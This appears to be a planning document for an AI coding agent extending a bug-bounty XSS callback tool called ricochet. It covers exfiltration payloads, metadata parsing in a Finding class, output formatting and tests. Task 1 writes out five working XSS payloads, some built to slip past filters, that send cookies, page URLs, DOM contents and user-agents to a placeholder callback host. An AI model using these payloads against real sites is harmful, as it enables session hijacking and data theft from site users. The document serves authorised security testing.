---
phase: 08-triggers-reporting
plan: 04
type: execute
wave: 2
depends_on: ["08-01"]
files_modified:
  - ricochet/payloads/builtin/xss-exfil.txt
  - ricochet/payloads/xss.py
  - ricochet/server/http.py
  - ricochet/output/finding.py
  - tests/test_xss_metadata.py
autonomous: true

must_haves:
  truths:
    - "When XSS fires, callback captures DOM, cookies, URL, user-agent"
    - "XSS payloads with metadata capture are available"
    - "Callback server extracts and stores metadata from requests"
    - "Findings display captured metadata"
  artifacts:
    - path: "ricochet/payloads/builtin/xss-exfil.txt"
      provides: "XSS payloads with metadata capture JS"
    - path: "ricochet/server/http.py"
      provides: "Updated callback handler with metadata extraction"
    - path: "ricochet/output/finding.py"
      provides: "Finding with metadata property"
    - path: "tests/test_xss_metadata.py"
      provides: "Tests for metadata capture"
  key_links:
    - from: "ricochet/server/http.py"
      to: "ricochet/core/store.py"
      via: "record_callback with metadata in body"
      pattern: "store\\.record_callback"
    - from: "ricochet/output/finding.py"
      to: "callback_body"
      via: "metadata extraction from JSON body"
      pattern: "json\\.loads.*callback_body"
---

<objective>
Implement XSS metadata capture for rich callback data

Purpose: When XSS payloads execute, capture comprehensive context (DOM snapshot, cookies, localStorage, URL, user-agent) to demonstrate real impact in bug bounty reports. This transforms simple "XSS fires" into "XSS in admin panel captures session cookie and user list".

Output: Enhanced XSS payloads with JS exfiltration, callback server metadata extraction, Finding class with metadata property.
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/08-triggers-reporting/08-RESEARCH.md

# Existing infrastructure
@ricochet/payloads/xss.py
@ricochet/payloads/builtin/xss-callback.txt
@ricochet/server/http.py
@ricochet/output/finding.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create XSS exfiltration payloads</name>
  <files>ricochet/payloads/builtin/xss-exfil.txt</files>
  <action>
Create XSS payloads that capture and exfiltrate metadata:

Create `ricochet/payloads/builtin/xss-exfil.txt` with payloads that:
1. Capture URL, cookies, DOM snippet, user-agent
2. Send as JSON via POST or query string
3. Truncate DOM to 50KB to avoid memory issues
4. Work across different contexts (script, event handler, etc.)

Payload templates (from research):

```
# Full metadata capture via fetch POST
<script>(function(){var d=document,l=location;fetch('{{CALLBACK}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:l.href,cookies:d.cookie,dom:d.body.innerHTML.substring(0,50000),ua:navigator.userAgent,ref:d.referrer,ts:Date.now()})})})();</script>

# SVG with fetch POST (bypasses some filters)
<svg onload="(function(){var d=document,l=location;fetch('{{CALLBACK}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:l.href,cookies:d.cookie,dom:d.body.innerHTML.substring(0,50000),ua:navigator.userAgent})})})()">

# Image fallback (no CORS issues)
<img src=x onerror="new Image().src='{{CALLBACK}}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)">

# Compact event handler
<input onfocus="fetch('{{CALLBACK}}',{method:'POST',body:JSON.stringify({u:location.href,c:document.cookie,d:document.body.innerHTML.slice(0,10000)})})" autofocus>

# Script src with query string (simpler, works when inline blocked)
<script>new Image().src='{{CALLBACK}}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&ua='+encodeURIComponent(navigator.userAgent)</script>
```

Use {{CALLBACK}} placeholder consistently (substituted by injector).
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
wc -l ricochet/payloads/builtin/xss-exfil.txt
cat ricochet/payloads/builtin/xss-exfil.txt | grep -c "{{CALLBACK}}"
```
Should show 5+ payloads, all containing {{CALLBACK}}.
  </verify>
  <done>xss-exfil.txt exists with 5+ payloads capturing cookies, URL, DOM, user-agent</done>
</task>

<task type="auto">
  <name>Task 2: Update XSS generator and Finding for metadata</name>
  <files>ricochet/payloads/xss.py, ricochet/output/finding.py</files>
  <action>
1. Update `ricochet/payloads/xss.py`:
   - Add method `generate_exfil(callback_url)` that yields payloads from xss-exfil.txt
   - Keep existing `generate()` for simple callback payloads
   - Context hint: "html:exfil" for exfil payloads

2. Update `ricochet/output/finding.py`:
   - Add `metadata` property to Finding class:
     ```python
     @property
     def metadata(self) -> dict | None:
         """Extract metadata from callback body if present.

         XSS exfiltration payloads send JSON with captured data.
         Returns dict with url, cookies, dom, ua (user-agent), etc.
         Returns None if body is not valid JSON or not present.
         """
         if not self.callback_body:
             return None
         try:
             data = json.loads(self.callback_body.decode('utf-8'))
             if isinstance(data, dict):
                 return data
         except (json.JSONDecodeError, UnicodeDecodeError, AttributeError):
             pass
         return None
     ```

   - Add `has_metadata` property: `return self.metadata is not None`

Import json at top of finding.py.
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
python -c "
from ricochet.payloads.xss import XSSPayloadGenerator
gen = XSSPayloadGenerator()
exfil_payloads = list(gen.generate_exfil('http://test'))
print(f'Exfil payloads: {len(exfil_payloads)}')
"
```
  </verify>
  <done>XSSPayloadGenerator.generate_exfil() yields metadata-capturing payloads, Finding.metadata extracts JSON from callback body</done>
</task>

<task type="auto">
  <name>Task 3: Update output formatters for metadata</name>
  <files>ricochet/output/formatters.py, tests/test_xss_metadata.py</files>
  <action>
1. Update `ricochet/output/formatters.py`:
   - In output_json, if finding.has_metadata:
     ```python
     if finding.has_metadata:
         record["finding"]["callback"]["metadata"] = finding.metadata
     ```

   - In output_text verbose mode, if finding.has_metadata:
     ```python
     if finding.has_metadata:
         meta = finding.metadata
         print(f"    === Captured Metadata ===", file=file)
         if meta.get('url'):
             print(f"    Victim URL: {meta['url']}", file=file)
         if meta.get('cookies'):
             print(f"    Cookies: {meta['cookies'][:100]}{'...' if len(meta.get('cookies', '')) > 100 else ''}", file=file)
         if meta.get('ua'):
             print(f"    User-Agent: {meta['ua']}", file=file)
         if meta.get('dom'):
             dom_preview = meta['dom'][:200].replace('\n', ' ')
             print(f"    DOM: {dom_preview}...", file=file)
     ```

2. Create `tests/test_xss_metadata.py`:
   - Test Finding.metadata with valid JSON body
   - Test Finding.metadata with invalid/missing body returns None
   - Test output_json includes metadata when present
   - Test output_text shows metadata in verbose mode
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
python -m pytest tests/test_xss_metadata.py -v
```
  </verify>
  <done>Formatters display captured metadata, tests verify metadata extraction</done>
</task>

</tasks>

<verification>
```bash
cd /Users/aidan/projects/security/ricochet

# Exfil payloads exist
cat ricochet/payloads/builtin/xss-exfil.txt | head -5

# Generator works
python -c "
from ricochet.payloads.xss import XSSPayloadGenerator
gen = XSSPayloadGenerator()
for payload, ctx in list(gen.generate_exfil('http://test'))[:2]:
    print(f'[{ctx}] {payload[:60]}...')
"

# Finding metadata extraction
python -c "
from ricochet.output.finding import Finding
import json
f = Finding(
    correlation_id='test', target_url='http://x', parameter='p',
    payload='x', context='xss', injected_at=0, callback_id=1,
    source_ip='1.1.1.1', request_path='/', callback_headers={},
    callback_body=json.dumps({'url': 'http://victim', 'cookies': 'session=abc'}).encode(),
    received_at=1, delay_seconds=1
)
print(f'Has metadata: {f.has_metadata}')
print(f'Metadata: {f.metadata}')
"

# Tests pass
python -m pytest tests/test_xss_metadata.py -v
```
</verification>

<success_criteria>
- xss-exfil.txt contains 5+ payloads that capture cookies, URL, DOM, user-agent
- XSSPayloadGenerator.generate_exfil() yields exfiltration payloads
- Finding.metadata extracts JSON data from callback body
- output_json includes metadata object when present
- output_text verbose mode shows formatted metadata
- DOM truncated to 50KB in payloads to prevent memory issues
</success_criteria>

<output>
After completion, create `.planning/phases/08-triggers-reporting/08-04-SUMMARY.md`
</output>
